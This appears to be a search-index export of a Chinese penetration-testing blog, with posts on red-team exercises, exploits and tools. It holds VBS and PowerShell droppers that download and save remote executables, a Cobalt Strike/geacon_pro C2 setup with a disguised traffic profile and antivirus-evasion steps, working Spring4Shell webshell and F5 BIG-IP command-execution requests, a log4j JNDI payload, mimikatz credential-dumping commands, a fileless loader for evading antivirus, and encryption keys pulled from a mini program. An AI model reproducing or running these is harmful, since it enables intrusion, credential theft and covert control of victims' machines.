直接把所有流量走一遍burpsuite或者xray，效率最高。","categories":[],"tags":[{"name":"hvv","slug":"hvv","permalink":"https://blog.njcit.me/tags/hvv/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://blog.njcit.me/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"}]},{"title":"攻防演练学习笔记","slug":"渗透记录/攻防演练学习笔记","date":"2023-02-13T14:05:05.000Z","updated":"2023-02-17T03:36:53.997Z","comments":true,"path":"2023/02/13/渗透记录/攻防演练学习笔记/","link":"","permalink":"https://blog.njcit.me/2023/02/13/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"正文 wget.vbs 1set x= createobject(&quot;microsoft.xmlhttp&quot;):x.open &quot;get&quot;,lcase(wscript.arguments(0)),0:x.send():set s = createobject(&quot;adodb.stream&quot;):s.mode = 3:s.type = 1:s.open():s.write(x.responsebody):s.savetofile lcase(wscript.arguments(1)),2 f2a.vbs 1234567891011121314Dim obj1,obj2 Dim url start = timer url = &quot;http://x.x.x.x/SQLAGENTIHC.exe&quot; Set obj1 = CreateObject(&quot;msxml2.xmlhttp&quot;) Set obj2 = CreateObject(&quot;adodb.stream&quot;) obj1.open &quot;get&quot;,url,False obj1.send temp = obj1.responseBody obj2.Type = 1 obj2.Mode = 3 obj2.Open() obj2.Write(temp) obj2.SaveToFile &quot;C:\\Users\\AllUse~1\\SQLAGENTIHC.exe&quot;,2 ftp.vbs 12345open 221.229.215.227110110get NDEServer.exe C:\\ProgramData\\boot.exebye download.ps1 12$client = New-Object System.Net.WebClient $client.DownloadFile(&quot;http://9x.x.x.x/PL-0000-t.exe&quot;,&quot;C:\\Windows\\TEMP\\KLPBO16A.exe&quot;)","categories":[],"tags":[{"name":"攻防演练","slug":"攻防演练","permalink":"https://blog.njcit.me/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"}]},{"title":"frida学习笔记","slug":"Android/frida学习笔记","date":"2023-02-12T13:19:29.000Z","updated":"2023-02-12T13:19:29.059Z","comments":true,"path":"2023/02/12/Android/frida学习笔记/","link":"","permalink":"https://blog.njcit.me/2023/02/12/Android/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"xray使用入门","slug":"渗透工具/xray使用入门","date":"2023-02-10T02:12:24.000Z","updated":"2023-02-22T01:59:55.634Z","comments":true,"path":"2023/02/10/渗透工具/xray使用入门/","link":"","permalink":"https://blog.njcit.me/2023/02/10/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/xray%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/","excerpt":"","text":"前言 一款功能强大的安全评估工具，在各种比赛中，先用xray轮一下总有收获不是吗。 下载链接 支持正版，抵制盗版，谨防后门。 xray: https://stack.chaitin.com/tool/detail?id=1] rad: https://stack.chaitin.com/tool/detail?id=2 super-xray:https://github.com/4ra1n/super-xray 使用 基础使用 被动扫描 1.\\xray_windows_amd64.exe ws --listen 127.0.0.1:7777 --html-output time1.html 主动扫描 1.\\xray_windows_amd64.exe webscan --browser-crawler http://example.com --html-output vuln.html 从文件中读取url并进行扫描 1.\\xray_windows_amd64.exe ws --url-file url.txt --html-output aaaaaaa.html 或者使用super-xray图形化进行扫描 xray 仅扫描log4j漏洞 1.\\xray_windows_amd64.exe ws --poc poc-go-apache-log4j2-rce --url-file url.txt --html-output aaaaaaa.html xray仅扫描shiro 1.\\xray_windows_amd64.exe webscan --url &quot;http://ip:port/login&quot; --plugins shiro --html-output aaaaaaa.html 配置反链平台 在server config.yaml 配置如下,建议使用高端口。 12345678910111213141516171819202122reverse: db_file_path: &quot;xray.db&quot; # 反连平台数据库文件位置, 这是一个 KV 数据库 token: &quot;fake_token&quot; # 反连平台认证的 Token, 独立部署时不能为空 http: enabled: true listen_ip: 0.0.0.0 listen_port: &quot;4443&quot; ip_header: &quot;&quot; # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取 dns: enabled: false listen_ip: 0.0.0.0 domain: &quot;&quot; # DNS 域名配置 is_domain_name_server: false # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了 resolve: # DNS 静态解析规则 - type: A # A, AAAA, TXT 三种 record: localhost value: 127.0.0.1 ttl: 60 client: remote_server: false # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址 http_base_url: &quot;&quot; # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置 dns_server_ip: &quot;&quot; # 和 http_base_url 类似，实际用来访问 dns 服务器的地址 client config.yaml配置如下 12345reverse: token: &quot;fake_token&quot; client: remote_server: true http_base_url: &quot;http://1.1.1.1:4443&quot; 参考链接 https://docs.xray.cool/","categories":[],"tags":[{"name":"xray","slug":"xray","permalink":"https://blog.njcit.me/tags/xray/"},{"name":"自动化","slug":"自动化","permalink":"https://blog.njcit.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"geacon_pro快速上手","slug":"内网/geacon-pro快速上手","date":"2023-02-06T06:29:33.000Z","updated":"2023-02-17T03:48:04.302Z","comments":true,"path":"2023/02/06/内网/geacon-pro快速上手/","link":"","permalink":"https://blog.njcit.me/2023/02/06/%E5%86%85%E7%BD%91/geacon-pro%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/","excerpt":"","text":"前言 过不了360 本文主要记录一下使用二改的cobaltstrike配合geacon_pro的简单配置过程放链接： https://github.com/H4de5-7/geacon_pro https://github.com/TryGOTry/CobaltStrike_Cat_4.5 正文 CobaltStrike_Cat_4.5 配置 首先安装相应版本的jdk 12sudo apt install openjdk-11-jre-headlesssudo apt install openjdk-11-jdk 然后配置CatClient.properties，这个没啥好说的，都有相关提示说明，然后直接运行teamserver就行，基本做到了傻瓜化。 geacon_pro配置 配置公钥 用到的工具BeaconTool.jar，需要注意运行这个工具需要使用jdk1.8,运行过一次cs的服务端之后，会在同目录生成.cobaltstrike.beacon_keys文件，建议将此文件复制一份到本地，我这里将文件重命名为了1111,运行以下命令就可以获取公钥： 1java -jar .\\BeaconTool.jar -i .\\1111 -rsa image-20230206144500059 替换到geacon_pro项目的config/config.go,这里注意一下不能有多余的空格，不然会报错，如下： image-20230206144727301 修改c2地址 下面的c2的ip和端口先在cs里面新建一个https的listen，然后填入即可 image-20230206150730989 适配C2profile 提供的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106# default sleep time is 60sset sleeptime &quot;3000&quot;;set jitter &quot;7&quot;;https-certificate &#123; set C &quot;KZ&quot;; set CN &quot;foren.zik&quot;; set O &quot;NN Fern Sub&quot;; set OU &quot;NN Fern&quot;; set ST &quot;KZ&quot;; set validity &quot;365&quot;;&#125;# define indicators for an HTTP GEThttp-get &#123; set uri &quot;/www/handle/doc&quot;; client &#123; #header &quot;Host&quot; &quot;aliyun.com&quot;; # base64 encode session metadata and store it in the Cookie header. metadata &#123; base64url; prepend &quot;SESSIONID=&quot;; header &quot;Cookie&quot;; &#125; &#125; server &#123; # server should send output with no changes #header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;; header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Connection&quot; &quot;keep-alive&quot;; header &quot;Vary&quot; &quot;Accept&quot;; header &quot;Pragma&quot; &quot;public&quot;; header &quot;Expires&quot; &quot;0&quot;; header &quot;Cache-Control&quot; &quot;must-revalidate, post-check=0, pre-check=0&quot;; output &#123; mask; netbios; prepend &quot;data=&quot;; append &quot;%%&quot;; print; &#125; &#125;&#125;# define indicators for an HTTP http-post &#123; # Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided] set uri &quot;/IMXo&quot;; client &#123; #header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; # transmit our session identifier as /submit.php?id=[identifier] id &#123; mask; netbiosu; prepend &quot;user=&quot;; append &quot;%%&quot;; header &quot;User&quot;; &#125; # post our output with no real changes output &#123; mask; base64url; prepend &quot;data=&quot;; append &quot;%%&quot;; print; &#125; &#125; # The server&#x27;s response to our HTTP POST server &#123; header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;; header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Connection&quot; &quot;keep-alive&quot;; header &quot;Vary&quot; &quot;Accept&quot;; header &quot;Pragma&quot; &quot;public&quot;; header &quot;Expires&quot; &quot;0&quot;; header &quot;Cache-Control&quot; &quot;must-revalidate, post-check=0, pre-check=0&quot;; # this will just print an empty string, meh... output &#123; mask; netbios; prepend &quot;data=&quot;; append &quot;%%&quot;; print; &#125; &#125;&#125;post-ex &#123; set spawnto_x86 &quot;c:\\\\windows\\\\syswow64\\\\rundll32.exe&quot;; set spawnto_x64 &quot;c:\\\\windows\\\\system32\\\\rundll32.exe&quot;; set thread_hint &quot;ntdll.dll!RtlUserThreadStart+0x1000&quot;; set pipename &quot;DserNamePipe##, PGMessagePipe##, MsFteWds##&quot;; set keylogger &quot;SetWindowsHookEx&quot;;&#125; 修改 CatServer.properties指定为刚刚创建的c2.profile image-20230206151245027 修改客户端的相关选项为false image-20230206151330099 编译运行 在Linux下面编译运行 1CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go image-20230206151620111 image-20230206151640780 高级配置 使用https://github.com/burrowers/garble进行混淆，混淆是在Windows下面进行，并且使用的是cmd。 1234go install mvdan.cc/garble@latestset GO111MODULE=ongo get mvdan.cc/garblegarble.exe build image-20230208151330801 修改aes iv，在config.go修改完记得在CatServer.properties也修改一下 image-20230208172056488 修改CatServer.properties版本和端口，尽量高端口 image-20230210112710514","categories":[],"tags":[{"name":"geacon_pro","slug":"geacon-pro","permalink":"https://blog.njcit.me/tags/geacon-pro/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://blog.njcit.me/tags/cobaltstrike/"}]},{"title":"渗透测试实用小工具","slug":"渗透工具/渗透测试实用小工具","date":"2023-02-03T01:14:09.000Z","updated":"2023-02-28T01:13:03.935Z","comments":true,"path":"2023/02/03/渗透工具/渗透测试实用小工具/","link":"","permalink":"https://blog.njcit.me/2023/02/03/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E7%94%A8%E5%B0%8F%E5%B7%A5%E5%85%B7/","excerpt":"","text":"前言 工欲善其事，必先利其器。一个好的工具可以提升工作的效率，把自己从重复的工作中解放出来。 工具 外网部分 springboot heapdump 敏感信息提取工具：https://github.com/whwlsfb/JDumpSpider redis利用工具：https://github.com/yuyan-sec/RedisEXP jwt密码爆破：https://github.com/brendan-rius/c-jwt-cracker 漏洞验证框架：https://github.com/projectdiscovery/nuclei httpx: https://github.com/projectdiscovery/httpx 12go install -v github.com/projectdiscovery/httpx/cmd/httpx@latesthttpx -l .\\url.txt -title -status-code -tech-detect ARL自动化资产收集：https://github.com/TophantTechnology/ARL 内网部分 CobaltStrike C2：https://github.com/H4de5-7/geacon_pro Viper：https://github.com/FunnyWolf/Viper Android部分 frida:https://frida.re/ jadx:https://github.com/skylot/jadx 杂项部分 scoop:https://scoop.sh/ oh my zsh:https://ohmyz.sh/ oh my posh:https://ohmyposh.dev/ 结语 感谢开源，从开源中来，到开源中去。","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://blog.njcit.me/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"二改frp使用技巧","slug":"内网/二改frp使用技巧","date":"2023-02-02T03:14:11.000Z","updated":"2023-02-02T06:05:44.050Z","comments":true,"path":"2023/02/02/内网/二改frp使用技巧/","link":"","permalink":"https://blog.njcit.me/2023/02/02/%E5%86%85%E7%BD%91/%E4%BA%8C%E6%94%B9frp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","excerpt":"","text":"前言 今年的华为行动来的格外的早一些，过完年环境忘得差不多了，打内网没有frp怎么行，搞到一半发现有更方便的防止溯源的方法，文末说一下，就这样。 正文 魔改frp的下载链接,生成自定义加密的服务器IP的方法可以参考issue，这个就不多讲了，重点讲一下安全配置，默认情况下生成的配置文件是不带密码，这里放上两个官方带密码的例子： 服务端： 123456789101112131415[common]bind_addr = 0.0.0.0bind_port = 5000# 开启kcp模式kcp_bind_port =5000authentication_method = tokentoken = you_token# IP 与 bind_addr 默认相同，可以不设置# dashboard_addr = 0.0.0.0# 端口必须设置，只有设置web页面才生效dashboard_port = 5001# 用户密码保平安dashboard_user = rootdashboard_pwd = password 客户端： 12345678910111213[common]server_addr = p0vj/==# kcp监听的端口server_port = 5000protocol = kcptls_enable = trueauthentication_method = tokentoken = you_token[plugin_socks5]type = tcpremote_port = 11111plugin = socks5 远程加载 1frpc.exe -c http://127.0.0.1/frpc.ini 其他方案 可以使用这个https://github.com/Ggasdfg321/FreeFRP来搜索互联网上未授权的frp。 结尾 感谢开源","categories":[],"tags":[{"name":"内网","slug":"内网","permalink":"https://blog.njcit.me/tags/%E5%86%85%E7%BD%91/"},{"name":"frp","slug":"frp","permalink":"https://blog.njcit.me/tags/frp/"}]},{"title":"nali数据库分享","slug":"杂项/nali数据库分享","date":"2023-02-01T00:54:05.000Z","updated":"2023-06-21T02:26:44.241Z","comments":true,"path":"2023/02/01/杂项/nali数据库分享/","link":"","permalink":"https://blog.njcit.me/2023/02/01/%E6%9D%82%E9%A1%B9/nali%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E4%BA%AB/","excerpt":"","text":"正文 链接：https://wwi.lanzoup.com/iDva60maofkh 在新机器上用scoop装nali，发现域名解析失败了： 用我上面的文件保存在如下路径C:\\{user},即可h","categories":[],"tags":[{"name":"nali","slug":"nali","permalink":"https://blog.njcit.me/tags/nali/"}]},{"title":"2022 top 10漏洞","slug":"poc_exp/2022_top10","date":"2023-01-28T02:14:22.000Z","updated":"2023-01-28T03:26:43.844Z","comments":true,"path":"2023/01/28/poc_exp/2022_top10/","link":"","permalink":"https://blog.njcit.me/2023/01/28/poc_exp/2022_top10/","excerpt":"","text":"前言 发现top10居然有好几个我没遇到过，这不得记录一下。 exp CVE-2021-44228 log4j远程代码执行 基础payload:${jndi:ldap://ky28eo.dnslog.cn} CVE-2022-30190 看了下复现的文章，这是一个office的远程代码执行漏洞，poc见：https://github.com/JohnHammond/msdt-follina CVE-2022-22965 spring的一个洞，限制比较多，poc如下： 12345678910111213GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host:x.x.x.xAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1 CVE-2022-0609 chrome漏洞，无poc，可以参考先知的分析文章 F5 BIGIP认证绕过 CVE-2022-1388 poc 123456789POST /mgmt/tm/util/bash HTTP/1.1Host: 127.0.0.1Authorization: Basic YWRtaW46X-F5-Auth-Token: aConnection: X-F5-Auth-TokenContent-type: application/jsonContent-Length: 41&#123;&quot;command&quot;:&quot;run&quot;, &quot;utilCmdArgs&quot;: &quot;-c id&quot;&#125; CVE-2017-11882 这个 Office RCE 漏洞非常经典，在当时是通杀所有 Office 版本的。poc：https://github.com/Ridter/CVE-2017-11882 CVE-2022-41040 &amp;&amp; CVE-2022-41082 CVE-2022-41040 Microsoft Exchange Server权限提升漏洞 CVE-2022-41082 Microsoft Exchange Server 远程执行代码漏洞 poc :https://github.com/CronUp/Vulnerabilidades CVE-2022-27925 &amp;&amp; CVE-2022-41352 https://github.com/vnhacker1337/CVE-2022-27925-PoC https://github.com/Cr4ckC4t/cve-2022-41352-zimbra-rce CVE-2022-26134 https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL CVE-2022-30525 https://github.com/Henry4E36/CVE-2022-30525 参考文章 https://www.cnblogs.com/loongten/p/15822195.html https://paper.seebug.org/1915/ https://blog.csdn.net/qq_45894840/article/details/125200463 https://www.cnblogs.com/cute-puli/p/16329332.html https://xz.aliyun.com/t/11121 https://xz.aliyun.com/t/11418 https://www.sqlsec.com/2020/10/office.html https://www.cnblogs.com/dnoir/p/microsoft-exchange-server-cve202241040--cve2022410.html https://www.yang99.top/index.php/archives/82/ https://zgao.top/cve-2022-26134-confluence-ognl%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ https://zgao.top/cve-2022-30525-zyxel-firewalls-ztp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","categories":[],"tags":[{"name":"exp","slug":"exp","permalink":"https://blog.njcit.me/tags/exp/"}]},{"title":"openwrt相关","slug":"杂项/openwrt相关","date":"2023-01-18T07:54:32.000Z","updated":"2023-03-10T01:29:09.474Z","comments":true,"path":"2023/01/18/杂项/openwrt相关/","link":"","permalink":"https://blog.njcit.me/2023/01/18/%E6%9D%82%E9%A1%B9/openwrt%E7%9B%B8%E5%85%B3/","excerpt":"","text":"前言 生命不息，折腾不止，从斐讯k1到x86，感谢openwrt开发者的无私贡献。 常用固件 https://github.com/kiddin9/OpenWrt_x86-r2s-r4s-r5s-N1、 https://openwrt.org/zh/downloads 常用网站 https://www.right.com.cn/forum/portal.php 刷写 注意，要不你放/tmp/upload/，要不你就放在u盘里。 1dd if=/tmp/upload/openwrt-x86-64-combined-squashfs.img of=/dev/sda","categories":[],"tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://blog.njcit.me/tags/openwrt/"},{"name":"路由器","slug":"路由器","permalink":"https://blog.njcit.me/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"}]},{"title":"值得一看的网站","slug":"链接/index","date":"2023-01-18T07:14:22.000Z","updated":"2023-01-18T07:06:18.953Z","comments":true,"path":"2023/01/18/链接/index/","link":"","permalink":"https://blog.njcit.me/2023/01/18/%E9%93%BE%E6%8E%A5/index/","excerpt":"","text":"https://3gstudent.github.io/ https://www.somedoc.net/ https://xz.aliyun.com/ https://tttang.com/ https://i.hacking8.com/ https://bbs.kanxue.com/ https://www.52pojie.cn/ https://www.anquanke.com/ https://paper.seebug.org/ https://govuln.com/news/ https://www.v2ex.com/ https://pan.icu/ https://stack.chaitin.com/ https://tool.lu/ https://www.somd5.com/ https://www.virustotal.com/gui/home/upload https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets https://websec.readthedocs.io/zh/latest/ https://yeasy.gitbook.io/docker_practice/ http://wiki.peiqi.tech/","categories":[],"tags":[{"name":"something","slug":"something","permalink":"https://blog.njcit.me/tags/something/"}]},{"title":"内网渗透记录","slug":"内网/内网渗透记录","date":"2023-01-18T03:05:52.000Z","updated":"2023-07-10T09:59:18.150Z","comments":true,"path":"2023/01/18/内网/内网渗透记录/","link":"","permalink":"https://blog.njcit.me/2023/01/18/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/","excerpt":"","text":"前言 随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧/命令/工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文 在Windows环境中抓密码 工具 搞安全谁不知道这个工具mimikatz 微软官方的工具，带数字签名，有一定的免杀效果但不多procdump SqlDumper，默认存放在C:FilesSQL Server，number代表SQL Server的版本。 powershell脚本Invoke-Mimikatz 之前能过卡巴斯基dump lsass的工具xpn 使用命令 mimikatz 交互模式 12privilege::debugsekurlsa::logonpasswords 一句话模式 1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit 配合sam和system文件,文件位置C:，默认情况下由于文件占用无法复制出来，可以使用以下命令保存。火绒居然不拦截，果然装火绒就是图一乐。 12reg save HKLM\\SYSTEM SystemBkup.hivreg save HKLM\\SAM SamBkup.hiv 1mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit msf开启rdp和端口转发 12run post/windows/manage/enable_rdp portfwd add -l 13389 -r 192.168.1.9 -p 3389 通用免杀 链接：https://github.com/TheD1rkMtr/FilelessPELoader 简易教程 server 123456789git clone https://github.com/TheD1rkMtr/FilelessPELoadercd FilelessPELoaderrm mimikatz.exewget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip7z x mimikatz_trunk.zipmv x64/mimikatz.exe .python3 aes.py mimikatz.exe## 启动http 服务python3 -m http.server client 1cl /EHsc FilelessPELoader.cpp 或者使用Visual Studio 2022编译 使用 1FilelessPELoader.exe 10.0.0.114 8000 cipher.bin key.bin 借用项目的图 filelessremotepe 通过sam system文件提取hash 使用注册表导出 123reg save HKLM\\SAM sam.hivreg save HKLM\\SYSTEM system.hivreg save HKLM\\SECURITY security.hiv 在pe模式下可以直接从C: 用mimikatz提取hash 12mimikatz.exe lsadump::sam /sam:sam.hiv /system:system.hiv mimikatz免杀 https://github.com/wheelerlaw/go-mimikatz https://xz.aliyun.com/t/10821 https://github.com/crow821/crowsec 参考链接 https://www.freebuf.com/articles/web/231880.html https://github.com/PowerShellMafia/PowerSploit https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/ https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://blog.njcit.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.njcit.me/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"c和c++相关笔记","slug":"写代码/c和c++相关笔记","date":"2023-01-16T01:37:52.000Z","updated":"2023-06-21T02:26:44.116Z","comments":true,"path":"2023/01/16/写代码/c和c++相关笔记/","link":"","permalink":"https://blog.njcit.me/2023/01/16/%E5%86%99%E4%BB%A3%E7%A0%81/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言 多线程卷起来，要把理论落实到实践中去，一点点积累起来逆向的基础，一点点学习和杀软对抗，迟早有一天我也能成为re大佬。这篇文章主要记录一下学习隐藏导入表的学习记录。 正文 c编译环境搭建 下载MinGW并将bin目录加入环境变量； 下载vscode 下载visualstudio 环境搭建到此为止 学习笔记 隐藏User32.dll导入表 隐藏前的源码 123456789#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;int main()&#123; printf(&quot;hello world\\n&quot;); MessageBox(0, TEXT(&quot;hello world&quot;), 0, 0); return 0;&#125; 隐藏后的源码 1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;typedef int(WINAPI * pMessageBox) ( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType );int main()&#123; printf(&quot;hello world\\n&quot;); pMessageBox MyMessageBox = (pMessageBox)GetProcAddress(LoadLibrary(&quot;User32.dll&quot;), &quot;MessageBoxA&quot;); MyMessageBox(0, TEXT(&quot;hello world&quot;), 0, 0); return 0;&#125; 首先查看GetProcAddress的文档，可以直接在参考链接3进行搜索，其他api也可以在里面搜索，不做过多赘述。 可以看到GetProcAddress这个函数需要传入两个参数，向我这样的初学者可能不太理解，直接看官方给的例子： 可以看到首先使用typedef定义了一个类似结构体的东东。 上面已经说的很详细了，这里就不再解读了。 MessageBox的语法上图已经给出来了。通过上面的一些微软的官方文档，就很容易理解上述隐藏user32.dll的代码是啥意思了，亦可以照猫画虎隐藏其他dll文件。 参考链接 c语言参考文档 通过隐藏导入表的方式规避杀软 win32api文档","categories":[],"tags":[{"name":"c","slug":"c","permalink":"https://blog.njcit.me/tags/c/"},{"name":"c++","slug":"c","permalink":"https://blog.njcit.me/tags/c/"},{"name":"代码","slug":"代码","permalink":"https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81/"}]},{"title":"golang学习笔记","slug":"写代码/golang学习笔记","date":"2023-01-12T12:38:52.000Z","updated":"2023-02-06T02:25:36.361Z","comments":true,"path":"2023/01/12/写代码/golang学习笔记/","link":"","permalink":"https://blog.njcit.me/2023/01/12/%E5%86%99%E4%BB%A3%E7%A0%81/golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言 随着golang越来越火，终于下定决心系统学一下golang，本身有一点Java/Python/PHP基础，以为只要学一下golang的语法就可以愉快的开发了，实际操作发现不是这样，本篇文章主要记录学习golang过程中遇到的坑。 正文 编译 Windows 下编译 Mac 和 Linux 64位可执行程序 123456789SET CGO_ENABLED=0SET GOOS=darwinSET GOARCH=amd64go build main.goSET CGO_ENABLED=0SET GOOS=linuxSET GOARCH=amd64go build main.go Linux 下编译 Mac 和 Windows 64位可执行程序 12CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.goCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go 参考链接 https://blog.csdn.net/panshiqu/article/details/53788067","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"https://blog.njcit.me/tags/%E5%BC%80%E5%8F%91/"},{"name":"golang","slug":"golang","permalink":"https://blog.njcit.me/tags/golang/"}]},{"title":"windows杂项","slug":"杂项/windows杂项","date":"2023-01-11T08:14:23.000Z","updated":"2023-06-21T02:26:44.326Z","comments":true,"path":"2023/01/11/杂项/windows杂项/","link":"","permalink":"https://blog.njcit.me/2023/01/11/%E6%9D%82%E9%A1%B9/windows%E6%9D%82%E9%A1%B9/","excerpt":"","text":"前言 本片文章主要记录一些奇奇怪怪的东西，不定期更新 正文 查看系统配置 1neofetch powershell命令历史文件位置,文件名ConsoleHost_history.txt 1cd %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine powershell 配置文件路径 1&quot;D:\\Users\\username\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1&quot; 数字权利激活工具https://github.com/TGSAN/CMWTAT_Digital_Edition ## Windows常用软件下载链接 - everything - MinGw - scoop - vscode - jdk1.8 - 微信 - chrome - 截图软件snipaste - https://www.balena.io/etcher - diskgenius 结尾 生命不息 学习不止","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://blog.njcit.me/tags/%E6%9D%82%E9%A1%B9/"}]},{"title":"记一次寻找微信小程序通信加密方法的过程","slug":"渗透记录/记一次寻找微信小程序通信加密方法的过程","date":"2023-01-10T02:47:57.000Z","updated":"2023-06-21T02:26:44.074Z","comments":true,"path":"2023/01/10/渗透记录/记一次寻找微信小程序通信加密方法的过程/","link":"","permalink":"https://blog.njcit.me/2023/01/10/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%9A%E4%BF%A1%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言 在测试微信小程序的过程中，发现通信的数据存在加密，如何在Windows使用burpsuite进行抓包可以参考我之前的文章，在对小程序进行反编译寻找加密方法和加密过程中，也发现了一些有意思的事，故此记录一下，如何对小程序进行反编译可以参考我之前的文章。 过程 直接在vscode里面搜索crypt，可以发现如下的几个加密函数： 加密方法des-ecb-pkcs7，密钥：t2b4h6y4l5 第二处加密为aes-ecb-pkcs7,密钥：f0c7caf9a2b8a8ff 这里又发现一处加密，应该是rsa加密，加密公钥为： MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDGOJ8XSE9vjpoRMY8ekbTNbK5ISKDRvnFA/6JLoqAFA2EhcoSMx5R/X1jsRs1O1TxD5FspCS1Qh3swNB4A3cJwLcmwlsGmcK+GID30lXbkm1insPJD/vfe2C9hUsdaXlrhwAG8hhH2CEKS0lzc11JWlKn9OQ4s9u8tITTVtZhO/wIDAQAB 这里还有一处des-cbc-pkcs7，key为21436587，iv为90785634 里面还有很多没法直接一眼看出来的加密，等遇到再说吧。 结尾 